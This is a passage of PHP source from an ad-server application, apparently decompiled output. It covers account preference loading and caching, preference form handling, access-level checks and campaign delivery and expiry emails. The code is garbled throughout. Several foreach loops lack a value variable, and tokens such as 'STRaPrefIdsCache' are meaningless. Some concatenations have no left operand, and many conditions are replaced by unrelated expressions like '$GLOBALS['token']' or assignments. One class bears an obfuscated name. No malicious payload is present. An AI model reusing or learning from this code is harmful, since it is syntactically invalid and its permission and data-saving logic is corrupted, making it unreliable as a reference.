						$doAffiliates->find();

						if ($doAffiliates->getRowCount() == 1) {
							$aOwningAgencyId = $doAffiliates->getAll(array('agencyid'), false, true);
							$owningAgencyId = $aOwningAgencyId[0];
						}
					}

				}


				if ($owningAgencyId == 0) {
					OA_Preferences::_unsetPreferences();
					return NULL;
				}

				$doAgency = OA_Dal::factoryDO('agency');
				$doAgency->agencyid = $owningAgencyId;
				$doAgency->find();

				if ($doAgency->getRowCount() == 1) {
					$aManagerAccountId = $doAgency->getAll(array('account_id'), false, true);
					$managerAccountId = $aManagerAccountId[0];
					$aManagerPreferenceValues = OA_Preferences::_getPreferenceValues($managerAccountId);
					OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aManagerPreferenceValues, $loadExtraInfo);
				}

				if (!$parentOnly) {
					if (!is_numeric($accountId)) {
						$currentAccountId = OA_Permission::getAccountId();
					}
					else {
						$currentAccountId = $accountId;
					}

					if ($currentAccountId <= 0) {
						OA_Preferences::_unsetPreferences();
						return NULL;
					}

					$aCurrentPreferenceValues = OA_Preferences::_getPreferenceValues($currentAccountId);
					OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aCurrentPreferenceValues, $loadExtraInfo);
				}

			}

		}

		$aPreferences['language'] = !empty($aConf['max']['language']) ? $aConf['max']['language'] : 'en';

		if ($userId = OA_Permission::getUserId()) {
			$doUser = OA_Dal::factoryDO('users');
			$doUser->get('user_id', $userId);

			if (!empty($doUser->language)) {
				$aPreferences['language'] = $doUser->language;
			}
		}
		if ($return) {
			return $aPreferences;
		}
		else {
			$GLOBALS['_MAX']['PREF'] = $aPreferences;
		}
	}

	public function loadPreferencesByNameAndAccount($accountId, $aPreferencesNames, $accountType, $useCache = true)
	{
		$aPrefs = OA_Preferences::cachePreferences($accountId, $aPreferencesNames);

		if (count($aPrefs) == count($aPreferencesNames)) {
			return $aPrefs;
		}

		$aPrefsIds = OA_Preferences::getCachedPreferencesIds($aPreferencesNames, $accountType);
		$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
		$doAccount_preference_assoc->account_id = $accountId;
		$doAccount_preference_assoc->whereInAdd('preference_id', $aPrefsIds);
		$doAccount_preference_assoc->find();
		$aPrefs = array();
		$prefsIdsFlip = array_flip($aPrefsIds);

		while ($doAccount_preference_assoc->fetch()) {
			$aPrefs[$prefsIdsFlip[$doAccount_preference_assoc->preference_id]] = $doAccount_preference_assoc->value;
		}

		OA_Preferences::cachePreferences($accountId, $aPrefs);
		return $aPrefs;
	}

	public function getCachedPreferencesIds($aPrefNames, $accountType)
	{
		static $aPrefIdsCache;
		$aPrefFound = array();
		$aPrefNotFound = array();

		foreach ($aPrefNames as $prefName) {
			if (isset($aPrefIdsCache[$accountType][$prefName])) {
				$aPrefFound[$prefName] = $aPrefIdsCache[$accountType][$prefName];
			}
			else {
				$aPrefNotFound[$prefName] = $prefName;
			}
		}

		if (!empty($aPrefNotFound)) {
			$aPrefs = OA_Preferences::getPreferenceIds($aPrefNotFound, $accountType);

			if (is_array($aPrefs)) {
				foreach ($aPrefs as $prefId => ) {
					$prefName = STRaPrefIdsCache;
					$aPrefIdsCache[$accountType][$prefName] = $prefId;
					$aPrefFound[$prefName] = $prefId;
				}
			}
		}

		return $aPrefFound;
	}

	public function getPreferenceIds($aPrefNames, $accountType)
	{
		$doPreferences = OA_Dal::factoryDO('preferences');
		$doPreferences->account_type = $accountType;
		$doPreferences->whereInAdd('preference_name', $aPrefNames);
		return $doPreferences->getAll(array('preference_id'), 'preference_name');
	}

	public function cachePreferences($accountId, $aPreferences, $readOnly = true, $cleanCache = false)
	{
		static $aCache = array();

		if ($cleanCache) {
			$aCache = array();
			return $aCache;
		}
		if ($readOnly) {
			$prefsFound = array();

			foreach ($aPreferences as $prefName) {
				if (isset($aCache[$accountId][$prefName])) {
					$prefsFound[$prefName] = $aCache[$accountId][$prefName];
				}
			}

			return $prefsFound;
		}
		else {
			foreach ($aPreferences as $prefValue => ) {
				$prefName = STRaCache;
				$aCache[$accountId][$prefName] = $prefValue;
			}

			return $aPreferences;
		}
	}

	public function loadAdminAccountPreferences($return = false)
	{
		if ($return) {
			$aPrefs = OA_Preferences::loadPreferences(false, true, false, true);
			return $aPrefs;
		}
		else {
			OA_Preferences::loadPreferences(false, false, false, true);
		}
	}

	public function loadAccountPreferences($accountId, $return = false)
	{
		if ($return) {
			$aPrefs = OA_Preferences::loadPreferences(false, true, false, false, $accountId);
			return $aPrefs;
		}
		else {
			OA_Preferences::loadPreferences(false, false, false, false, $accountId);
		}
	}

	public function processPreferencesFromForm($aElementNames, $aCheckboxes)
	{
		phpAds_registerGlobalUnslashed('token');

		if (!phpAds_SessionValidateToken($GLOBALS['token'])) {
			return false;
		}

		$aPreferenceTypes = array();
		$doPreferences = OA_Dal::factoryDO('preferences');
		$doPreferences->find();

		if ($doPreferences->getRowCount() < 1) {
			return false;
		}

		while ($doPreferences->fetch()) {
			$aPreference = $doPreferences->toArray();
			$aPreferenceTypes[$aPreference['preference_name']] = array('preference_id' => $aPreference['preference_id'], 'account_type' => $aPreference['account_type']);
		}

		if (empty($aPreferenceTypes)) {
			return false;
		}

		$currentAccountType = OA_Permission::getAccountType();
		$currentAccountId = OA_Permission::getAccountId();
		$aParentPreferences = OA_Preferences::loadPreferences(false, true, true);
		$aSavePreferences = array();
		$aDeletePreferences = array();

		foreach ($aElementNames as $preferenceName) {
			$access = OA_Preferences::hasAccess($currentAccountType, $aPreferenceTypes[$preferenceName]['account_type']);

			if ($access == false) {
				continue;
			}

			phpAds_registerGlobalUnslashed($preferenceName);
			if (isset($aCheckboxes[$preferenceName]) && ($GLOBALS['token'])) {
				$GLOBALS[$preferenceName] = '';
			}
			else {
				if (isset($aCheckboxes[$preferenceName]) && ($GLOBALS['token'])) {
					$GLOBALS[$preferenceName] = '1';
				}

			}


			if (isset($GLOBALS[$preferenceName])) {
				if (!isset($aParentPreferences[$preferenceName]) || ($GLOBALS['token'])) {
					$aSavePreferences[$preferenceName] = $GLOBALS[$preferenceName];
				}
				else if ($currentAccountType != OA_ACCOUNT_ADMIN) {
					$aDeletePreferences[$preferenceName] = $GLOBALS[$preferenceName];
				}
			}
		}

		foreach ($aSavePreferences as $preferenceValue => ) {
			$preferenceName = ($GLOBALS['token']);
			$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
			$doAccount_preference_assoc->account_id = $currentAccountId;
			$doAccount_preference_assoc->preference_id = $aPreferenceTypes[$preferenceName]['preference_id'];
			$doAccount_preference_assoc->find();

			if ($doAccount_preference_assoc->getRowCount() != 1) {
				$doAccount_preference_assoc->value = $preferenceValue;
				$result = $doAccount_preference_assoc->insert();

				if ($result === false) {
					return false;
				}
			}
			else {
				$doAccount_preference_assoc->fetch();
				$doAccount_preference_assoc->value = $preferenceValue;
				$result = $doAccount_preference_assoc->update();

				if ($result === false) {
					return false;
				}

			}

		}

		foreach ($aDeletePreferences as $preferenceValue => ) {
			$preferenceName = ($GLOBALS['token']);
			$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
			$doAccount_preference_assoc->account_id = $currentAccountId;
			$doAccount_preference_assoc->preference_id = $aPreferenceTypes[$preferenceName]['preference_id'];
			$doAccount_preference_assoc->find();

			if ($doAccount_preference_assoc->getRowCount() == 1) {
				$result = $doAccount_preference_assoc->delete();

				if ($result === false) {
					return false;
				}
			}
		}

		return true;
	}

	public function hasAccess($currentAccount, $preferenceLevel)
	{
		if (is_null($preferenceLevel) || is_null($preferenceLevel)) {
			return true;
		}

		if ($currentAccount == OA_ACCOUNT_ADMIN) {
			return true;
		}

		if ($currentAccount == OA_ACCOUNT_MANAGER) {
			if ($preferenceLevel == OA_ACCOUNT_ADMIN) {
				return false;
			}

			return true;
		}

		if (($currentAccount == OA_ACCOUNT_ADVERTISER) && is_null($preferenceLevel)) {
			return true;
		}

		if (($currentAccount == OA_ACCOUNT_TRAFFICKER) && is_null($preferenceLevel)) {
			return true;
		}

		return false;
	}

	public function disableStatisticsColumns($aColumns)
	{
		$currentAccountType = OA_Permission::getAccountType();

		if ($currentAccountType != OA_ACCOUNT_ADMIN) {
			return NULL;
		}

		foreach ($aColumns as $preference) {
			$doPreferences = OA_Dal::factoryDO('preferences');
			$doPreferences->preference_name = $preference;
			$doPreferences->find();

			if ($doPreferences->getRowCount() != 1) {
				continue;
			}

			$doPreferences->fetch();
			$aColumnPreference = $doPreferences->toArray();
			$columnPreferenceId = $aColumnPreference['preference_id'];
			$doAccount_preference_assoc = OA_Dal::factoryDO('account_preference_assoc');
			$doAccount_preference_assoc->preference_id = $columnPreferenceId;
			$doAccount_preference_assoc->find();

			while ($doAccount_preference_assoc->fetch()) {
				$doAccount_preference_assoc->value = 0;
				$doAccount_preference_assoc->update();
			}
		}
	}

	public function _unsetPreferences()
	{
		unset($GLOBALS['_MAX']['PREF']);
	}

	public function _getPreferenceValues($accountId)
	{
		$doAccount_Preference_Assoc = OA_Dal::factoryDO('account_preference_assoc');
		$doAccount_Preference_Assoc->account_id = $accountId;
		$aPreferenceValues = $doAccount_Preference_Assoc->getAll();
		return $aPreferenceValues;
	}

	public function _setPreferences(&$aPreferences, $aPreferenceTypes, $aPreferenceValues, $loadExtraInfo)
	{
		foreach ($aPreferenceValues as $aPreferenceValue) {
			if (isset($aPreferenceTypes[$aPreferenceValue['preference_id']])) {
				if (!$loadExtraInfo) {
					$aPreferences[$aPreferenceTypes[$aPreferenceValue['preference_id']]['preference_name']] = $aPreferenceValue['value'];
				}
				else {
					$aPreferences[$aPreferenceTypes[$aPreferenceValue['preference_id']]['preference_name']] = array('account_type' => $aPreferenceTypes[$aPreferenceValue['preference_id']]['account_type'], 'value' => $aPreferenceValue['value']);
				}
			}
		}

		if ($loadExtraInfo) {
			foreach ($aPreferenceTypes as $aPreferenceType) {
				if (!isset($aPreferences[$aPreferenceType['preference_name']])) {
					$aPreferences[$aPreferenceType['preference_name']]['account_type'] = $aPreferenceType['account_type'];
				}
			}
		}
	}

	public function getPreferenceDefaults()
	{
		$aPrefs = array(
			'default_banner_image_url'               => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => ''),
			'default_banner_destination_url'         => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => ''),
			'default_banner_weight'                  => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 1),
			'default_campaign_weight'                => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 1),
			'warn_email_admin'                       => array('account_type' => OA_ACCOUNT_ADMIN, 'default' => true),
			'warn_email_admin_impression_limit'      => array('account_type' => OA_ACCOUNT_ADMIN, 'default' => 100),
			'warn_email_admin_day_limit'             => array('account_type' => OA_ACCOUNT_ADMIN, 'default' => 1),
			'campaign_ecpm_enabled'                  => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => false),
			'contract_ecpm_enabled'                  => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => false),
			'warn_email_manager'                     => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => true),
			'warn_email_manager_impression_limit'    => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => 100),
			'warn_email_manager_day_limit'           => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => 1),
			'warn_email_advertiser'                  => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'warn_email_advertiser_impression_limit' => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 100),
			'warn_email_advertiser_day_limit'        => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => 1),
			'timezone'                               => array('account_type' => OA_ACCOUNT_MANAGER, 'default' => ''),
			'tracker_default_status'                 => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => MAX_CONNECTION_STATUS_APPROVED),
			'tracker_default_type'                   => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => MAX_CONNECTION_TYPE_SALE),
			'tracker_link_campaigns'                 => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => false),
			'ui_show_campaign_info'                  => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'ui_show_banner_info'                    => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'ui_show_campaign_preview'               => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => false),
			'ui_show_banner_html'                    => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => false),
			'ui_show_banner_preview'                 => array('account_type' => OA_ACCOUNT_ADVERTISER, 'default' => true),
			'ui_hide_inactive'                       => array('account_type' => NULL, 'default' => false),
			'ui_show_matching_banners'               => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => true),
			'ui_show_matching_banners_parents'       => array('account_type' => OA_ACCOUNT_TRAFFICKER, 'default' => false),
			'ui_show_entity_id'                      => array('account_type' => NULL, 'default' => false),
			'ui_novice_user'                         => array('account_type' => NULL, 'default' => true),
			'ui_week_start_day'                      => array('account_type' => NULL, 'default' => 1),
			'ui_percentage_decimals'                 => array('account_type' => NULL, 'default' => 2)
			);
		require_once MAX_PATH . '/lib/OA/Admin/Statistics/Fields/Delivery/Affiliates.php';
		require_once MAX_PATH . '/lib/OA/Admin/Statistics/Fields/Delivery/Default.php';
		$aStatisticsFieldsDelivery['affiliates'] = &new OA_StatisticsFieldsDelivery_Affiliates();
		$aStatisticsFieldsDelivery['default'] = &new OA_StatisticsFieldsDelivery_Default();

		foreach ($aStatisticsFieldsDelivery as $obj) {
			foreach (array_keys($obj->getVisibilitySettings()) as $prefName) {
				$aPrefs[$prefName] = array('account_type' => OA_ACCOUNT_MANAGER, 'default' => false);
				$aPrefs[$prefName . '_label'] = array('account_type' => OA_ACCOUNT_MANAGER, 'default' => '');
				$aPrefs[$prefName . '_rank'] = array('account_type' => OA_ACCOUNT_MANAGER, 'default' => 0);
			}
		}

		$aDefaultColumns = array('ui_column_impressions', 'ui_column_clicks', 'ui_column_ctr', 'ui_column_revenue', 'ui_column_ecpm');
		$rank = 1;

		foreach ($aDefaultColumns as $prefName) {
			if (isset($aPrefs[$prefName])) {
				$aPrefs[$prefName]['default'] = true;
				$aPrefs[$prefName . '_rank']['default'] = $rank++;
			}
		}

		return $aPrefs;
	}
}

class _58u5q7w
{
	public $aAdminCache;
	public $aClientCache;
	public $aAgencyCache;

	public function sendCampaignDeliveryEmail($aAdvertiser, $oStartDate = NULL, $oEndDate = NULL, $campaignId = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$aAdvertiserPrefs = OA_Preferences::loadAccountPreferences($aAdvertiser['account_id'], true);
		$oTimezone = new Date_Timezone($aAdvertiserPrefs['timezone']);
		$this->convertStartEndDate($oStartDate, $oEndDate, $oTimezone);
		$aLinkedUsers = $this->getUsersLinkedToAccount('clients', $aAdvertiser['clientid']);
		$aLinkedUsers = $this->_addAdvertiser($aAdvertiser, $aLinkedUsers);
		$copiesSent = 0;
		if (!empty($aLinkedUsers) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			if ($aConf['email']['useManagerDetails']) {
				$aFromDetails = $this->_getAgencyFromDetails($aAdvertiser['agencyid']);
			}

			foreach ($aLinkedUsers as $aUser) {
				$aEmail = $this->prepareCampaignDeliveryEmail($aUser, $aAdvertiser['clientid'], $oStartDate, $oEndDate, $campaignId);

				if ($aEmail !== false) {
					if (!isset($aEmail['hasAdviews']) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
						if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
							$copiesSent++;

							if ($aConf['email']['logOutgoing']) {
								phpAds_userlogSetUser(phpAds_userMaintenance);
								phpAds_userlogAdd(phpAds_actionAdvertiserReportMailed, $aAdvertiser['clientid'], $aEmail['subject'] . "\n\n\n" . '                                     ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                     ' . $aEmail['contents']);
							}
						}
					}
				}
			}
		}
		if ($copiesSent) {
			OA::debug('   - Updating the date the report was last sent for advertiser ID ' . $aAdvertiser['clientid'] . '.', PEAR_LOG_DEBUG);
			$doUpdateClients = OA_Dal::factoryDO('clients');
			$doUpdateClients->clientid = $aAdvertiser['clientid'];
			$doUpdateClients->reportlastdate = OA::getNow();
			$doUpdateClients->update();
		}

		return $copiesSent;
	}

	public function prepareCampaignDeliveryEmail($aUser, $advertiserId, $oStartDate, $oEndDate, $campaignId = NULL)
	{
		Language_Loader::load('default', $aUser['language']);
		OA::debug('   - Preparing "campaign delivery" report for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
		global $strMailHeader;
		global $strSirMadam;
		global $strMailBannerStats;
		global $strMailReportPeriodAll;
		global $strMailReportPeriod;
		global $date_format;
		global $strMailSubject;
		$aResult = array('subject' => '', 'contents' => '', 'hasAdviews' => false);
		$aAdvertiser = $this->_loadAdvertiser($advertiserId);

		if ($aAdvertiser === false) {
			return false;
		}

		if ($aAdvertiser['report'] != 't') {
			OA::debug('   - Reports disabled for advertiser ID ' . $advertiserId . '.', PEAR_LOG_ERR);
			return false;
		}

		if (empty($aUser['email_address'])) {
			OA::debug('   - No email for User ID ' . $aUser['user_id'] . '.', PEAR_LOG_ERR);
			return false;
		}

		$aEmailBody = $this->_prepareCampaignDeliveryEmailBody($advertiserId, $oStartDate, $oEndDate, $campaignId);

		if ($aEmailBody['body'] == '') {
			OA::debug('   - No campaigns with delivery for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
			return false;
		}

		$email = $strMailHeader . "\n";

		if (!empty($aUser['contact_name'])) {
			$greetingTo = $aUser['contact_name'];
		}
		else if (!empty($aAdvertiser['contact'])) {
			$greetingTo = $aAdvertiser['contact'];
		}
		else if (!empty($aAdvertiser['clientname'])) {
			$greetingTo = $aAdvertiser['clientname'];
		}
		else {
			$greetingTo = $strSirMadam;
		}

		$email = str_replace('{contact}', $greetingTo, $email);
		$email .=  . $strMailBannerStats . "\n";
		$email = str_replace('{clientname}', $aAdvertiser['clientname'], $email);

		if (is_null($oStartDate)) {
			$email .=  . $strMailReportPeriodAll . "\n\n";
		}
		else {
			$email .=  . $strMailReportPeriod . "\n\n";
		}

		$email = str_replace('{startdate}', is_null($oStartDate) ? '' : $oStartDate->format($date_format), $email);
		$email = str_replace('{enddate}', $oEndDate->format($date_format), $email);
		$email .=  . $aEmailBody['body'] . "\n";
		$email .= $this->_prepareRegards($aAdvertiser['agencyid']);
		$aResult['subject'] = $strMailSubject . ': ' . $aAdvertiser['clientname'];
		$aResult['contents'] = $email;
		$aResult['hasAdviews'] = 0 < $aEmailBody['adviews'];
		return $aResult;
	}

	public function _prepareCampaignDeliveryEmailBody($advertiserId, $oStartDate, $oEndDate, $campaignId)
	{
		global $strCampaign;
		global $strBanner;
		$strCampaignLength = strlen($strCampaign);
		$strBannerLength = strlen($strBanner);
		$maxLength = max($strCampaignLength, $strBannerLength);
		$strCampaignPrint = '%-' . $maxLength . 's';
		$strBannerPrint = ' %-' . ($maxLength - 1) . 's';
		global $strImpressions;
		global $strClicks;
		global $strConversions;
		global $strTotal;
		global $strTotalThisPeriodLength;
		$strTotalImpressions = $strImpressions . ' (' . $strTotal . ')';
		$strTotalClicks = $strClicks . ' (' . $strTotal . ')';
		$strTotalConversions = $strConversions . ' (' . $strTotal . ')';
		$strTotalImpressionsLength = strlen($strTotalImpressions);
		$strTotalClicksLength = strlen($strTotalClicks);
		$strTotalConversionsLength = strlen($strTotalConversions);
		$strTotalThisPeriodLength = strlen($strTotalThisPeriod);
		$maxLength = max($strTotalImpressionsLength, $strTotalClicksLength, $strTotalConversionsLength, $strTotalThisPeriodLength);
		$adTextPrint = ' %' . $maxLength . 's';
		global $strLinkedTo;
		global $strNoStatsForCampaign;
		$emailBody = '';
		$totalAdviewsInPeriod = 0;
		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doCampaigns->clientid = $advertiserId;

		if (!empty($campaignId)) {
			$doCampaigns->campaignid = $campaignId;
		}

		$doCampaigns->orderBy('campaignid');
		$doCampaigns->find();

		if (0 < $doCampaigns->getRowCount()) {
			while ($doCampaigns->fetch()) {
				$aCampaign = $doCampaigns->toArray();
				if (($aCampaign['status'] == '0') || $GLOBALS['strCampaign']) {
					$emailBody .= "\n" . sprintf($strCampaignPrint, $strCampaign) . ' ';
					$emailBody .= strip_tags(phpAds_buildName($aCampaign['campaignid'], $aCampaign['campaignname'])) . "\n";
					$page = 'stats.php?clientid=' . $advertiserId . '&campaignid=' . $aCampaign['campaignid'] . '&statsBreakdown=day&entity=campaign&breakdown=history&period_preset=all_stats&period_start=&period_end=';
					$emailBody .= MAX::constructURL(MAX_URL_ADMIN, $page) . "\n";
					$emailBody .= '=======================================================' . "\n\n";
					$doBanners = OA_Dal::factoryDO('banners');
					$doBanners->campaignid = $aCampaign['campaignid'];
					$doBanners->orderBy('bannerid');
					$doBanners->find();

					if (0 < $doBanners->getRowCount()) {
						$adsWithDelivery = false;

						while ($doBanners->fetch()) {
							$aAd = $doBanners->toArray();
							$adImpressions = phpAds_totalViews($aAd['bannerid']);
							$adClicks = phpAds_totalClicks($aAd['bannerid']);
							$adConversions = phpAds_totalConversions($aAd['bannerid']);
							if ((0 < $adImpressions) || $GLOBALS['strCampaign'] || $GLOBALS['strCampaign']) {
								$adsWithDelivery = true;
								$emailBody .= sprintf($strBannerPrint, $strBanner) . ' ';
								$emailBody .= strip_tags(phpAds_buildBannerName($aAd['bannerid'], $aAd['description'], $aAd['alt'])) . "\n";

								if (!empty($aAd['URL'])) {
									$emailBody .= $strLinkedTo . ': ' . $aAd['URL'] . "\n";
								}

								$emailBody .= ' ------------------------------------------------------' . "\n";
								$adHasStats = false;

								if (0 < $adImpressions) {
									$adHasStats = true;
									$emailBody .= sprintf($adTextPrint, $strTotalImpressions) . ': ';
									$emailBody .= sprintf('%15s', phpAds_formatNumber($adImpressions)) . "\n";
									$aEmailBody = $this->_prepareCampaignDeliveryEmailBodyStats($aAd['bannerid'], $oStartDate, $oEndDate, 'impressions', $adTextPrint);
									$emailBody .= $aEmailBody['body'];
									$totalAdviewsInPeriod += $aEmailBody['adviews'];
								}

								if (0 < $adClicks) {
									$adHasStats = true;
									$emailBody .= "\n" . sprintf($adTextPrint, $strTotalClicks) . ': ';
									$emailBody .= sprintf('%15s', phpAds_formatNumber($adClicks)) . "\n";
									$aEmailBody = $this->_prepareCampaignDeliveryEmailBodyStats($aAd['bannerid'], $oStartDate, $oEndDate, 'clicks', $adTextPrint);
									$emailBody .= $aEmailBody['body'];
									$totalAdviewsInPeriod += $aEmailBody['adviews'];
								}

								if (0 < $adConversions) {
									$adHasStats = true;
									$emailBody .= "\n" . sprintf($adTextPrint, $strTotalConversions) . ': ';
									$emailBody .= sprintf('%15s', phpAds_formatNumber($adConversions)) . "\n";
									$aEmailBody = $this->_prepareCampaignDeliveryEmailBodyStats($aAd['bannerid'], $oStartDate, $oEndDate, 'conversions', $adTextPrint);
									$emailBody .= $aEmailBody['body'];
									$totalAdviewsInPeriod += $aEmailBody['adviews'];
								}

								$emailBody .= "\n";
							}
						}
					}

					if ($adsWithDelivery != true) {
						$emailBody .= $strNoStatsForCampaign . "\n\n\n";
					}
				}
			}
		}

		return array('body' => $emailBody, 'adviews' => $totalAdviewsInPeriod);
	}

	public function _prepareCampaignDeliveryEmailBodyStats($adId, $oStartDate, $oEndDate, $type, $adTextPrint)
	{
		$oDbh = &OA_DB::singleton();
		global $date_format;
		global $strNoViewLoggedInInterval;
		global $strNoClickLoggedInInterval;
		global $strNoConversionLoggedInInterval;
		global $strTotalThisPeriod;

		if ($type == 'impressions') {
			$nothingLogged = $strNoViewLoggedInInterval;
		}
		else if ($type == 'clicks') {
			$nothingLogged = $strNoClickLoggedInInterval;
		}
		else if ($type == 'conversions') {
			$nothingLogged = $strNoConversionLoggedInInterval;
		}
		else {
			return array('body' => '', 'adviews' => 0);
		}

		$emailBodyStats = '';
		$total = 0;
		$doDataSummaryAdHourly = OA_Dal::factoryDO('data_summary_ad_hourly');
		$doDataSummaryAdHourly->selectAdd();
		$doDataSummaryAdHourly->selectAdd('date_time');
		$doDataSummaryAdHourly->selectAdd('SUM(' . $type . ') as quantity');
		$doDataSummaryAdHourly->ad_id = $adId;
		$doDataSummaryAdHourly->whereAdd('impressions > 0');

		if (!is_null($oStartDate)) {
			$oDate = new Date($oStartDate);
			$oDate->toUTC();
			$doDataSummaryAdHourly->whereAdd('date_time >= ' . $oDbh->quote($oDate->format('%Y-%m-%d %H:%M:%S'), 'timestamp'));
		}

		$oDate = new Date($oEndDate);
		$oDate->toUTC();
		$doDataSummaryAdHourly->whereAdd('date_time <= ' . $oDbh->quote($oDate->format('%Y-%m-%d %H:%M:%S'), 'timestamp'));
		$doDataSummaryAdHourly->groupBy('date_time');
		$doDataSummaryAdHourly->orderBy('date_time DESC');
		$doDataSummaryAdHourly->find();

		if (0 < $doDataSummaryAdHourly->getRowCount()) {
			$aAdQuantity = array();

			while ($doDataSummaryAdHourly->fetch()) {
				$v = $doDataSummaryAdHourly->toArray();
				$oDate = new Date($v['date_time']);
				$oDate->setTZbyID('UTC');
				$oDate->convertTZ($oEndDate->tz);
				$k = $oDate->format($date_format);

				if (!isset($aAdQuantity[$k])) {
					$aAdQuantity[$k] = 0;
				}

				$aAdQuantity += $k;
			}

			foreach ($aAdQuantity as $quantity => ) {
				$day = OA_DB::singleton();
				$emailBodyStats .= sprintf($adTextPrint, $day) . ': ';
				$emailBodyStats .= sprintf('%15s', phpAds_formatNumber($quantity)) . "\n";
				$total += $quantity;
			}

			$emailBodyStats .= sprintf($adTextPrint, $strTotalThisPeriod) . ': ';
			$emailBodyStats .= sprintf('%15s', phpAds_formatNumber($total)) . "\n";
		}
		else {
			$emailBodyStats .= '  ' . $nothingLogged . "\n";
		}

		return array('body' => $emailBodyStats, 'adviews' => $total);
	}

	public function sendCampaignImpendingExpiryEmail($oDate, $campaignId)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		global $date_format;
		$oPreference = new OA_Preferences();

		if (!isset($this->aAdminCache)) {
			$adminAccountId = OA_Dal_ApplicationVariables::get('admin_account_id');
			$adminPrefsNames = $this->_createPrefsListPerAccount(OA_ACCOUNT_ADMIN);
			$aAdminPrefs = $oPreference->loadAccountPreferences($adminAccountId, $adminPrefsNames, OA_ACCOUNT_ADMIN);
			$aAdminUsers = $this->getAdminUsersLinkedToAccount();
			$this->aAdminCache = array($aAdminPrefs, $aAdminUsers);
		}
		else {
			list($aAdminPrefs, $aAdminUsers) = $this->aAdminCache;
		}

		$aPreviousOIDates = OX_OperationInterval::convertDateToPreviousOperationIntervalStartAndEndDates($oDate);
		$aPreviousOIDates = OX_OperationInterval::convertDateToPreviousOperationIntervalStartAndEndDates($aPreviousOIDates['start']);
		$doCampaigns = OA_Dal::staticGetDO('campaigns', $campaignId);

		if (!$doCampaigns) {
			return 0;
		}

		$aCampaign = $doCampaigns->toArray();

		if (!isset($this->aClientCache[$aCampaign['clientid']])) {
			$doClients = OA_Dal::staticGetDO('clients', $aCampaign['clientid']);
			$aLinkedUsers['advertiser'] = $this->getUsersLinkedToAccount('clients', $aCampaign['clientid']);
			$advertiserPrefsNames = $this->_createPrefsListPerAccount(OA_ACCOUNT_ADVERTISER);
			$aPrefs['advertiser'] = $oPreference->loadAccountPreferences($doClients->account_id, $advertiserPrefsNames, OA_ACCOUNT_ADVERTISER);

			if (!isset($aAgencyCache[$doClients->agencyid])) {
				$doAgency = OA_Dal::staticGetDO('agency', $doClients->agencyid);
				$aLinkedUsers['manager'] = $this->getUsersLinkedToAccount('agency', $doClients->agencyid);
				$managerPrefsNames = $this->_createPrefsListPerAccount(OA_ACCOUNT_MANAGER);
				$aPrefs['manager'] = $oPreference->loadAccountPreferences($doAgency->account_id, $managerPrefsNames, OA_ACCOUNT_MANAGER);
				$aAgencyFromDetails = $this->_getAgencyFromDetails($doAgency->agencyid);
				$this->aAgencyCache = array(
	$doClients->agencyid => array($aLinkedUsers['manager'], $aPrefs['manager'], $aAgencyFromDetails)
	);
			}
			else {
				$aAgencyFromDetails = $this->aAgencyCache[$doClients->agencyid][2];
				$aPrefs['manager'] = $this->aAgencyCache[$doClients->agencyid][2][1];
				$aLinkedUsers['manager'] = $this->aAgencyCache[$doClients->agencyid][2][1][0];
			}

			$aLinkedUsers['admin'] = $aAdminUsers;
			$aPrefs['admin'] = $aAdminPrefs;
			$aLinkedUsers['special']['advertiser'] = $doClients->toArray();
			$aLinkedUsers['special']['advertiser']['contact_name'] = $aLinkedUsers['special']['advertiser']['contact'];
			$aLinkedUsers['special']['advertiser']['email_address'] = $aLinkedUsers['special']['advertiser']['email'];
			$aLinkedUsers['special']['advertiser']['language'] = '';
			$aLinkedUsers['special']['advertiser']['user_id'] = 0;
			$aLinkedUsers = $this->_deleteDuplicatedUser($aLinkedUsers);
			$aPrefs['special'] = $aPrefs['admin'];
			$aPrefs['special']['warn_email_special'] = $aPrefs['special']['warn_email_advertiser'];
			$aPrefs['special']['warn_email_special_day_limit'] = $aPrefs['special']['warn_email_advertiser_day_limit'];
			$aPrefs['special']['warn_email_special_impression_limit'] = $aPrefs['special']['warn_email_advertiser_impression_limit'];
			$this->aClientCache = array(
	$aCampaign['clientid'] => array($aLinkedUsers, $aPrefs, $aAgencyFromDetails)
	);
		}
		else {
			$aAgencyFromDetails = $this->aClientCache[$aCampaign['clientid']][2];
			$this->aClientCache;
			$this->aClientCache;
		}

		$copiesSent = 0;

		foreach ($aLinkedUsers as $aUsers => ) {
			$accountType = ($aConf = $GLOBALS['_MAX']['CONF']);
			if (($accountType == 'special') || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$aFromDetails = $aAgencyFromDetails;
			}
			else {
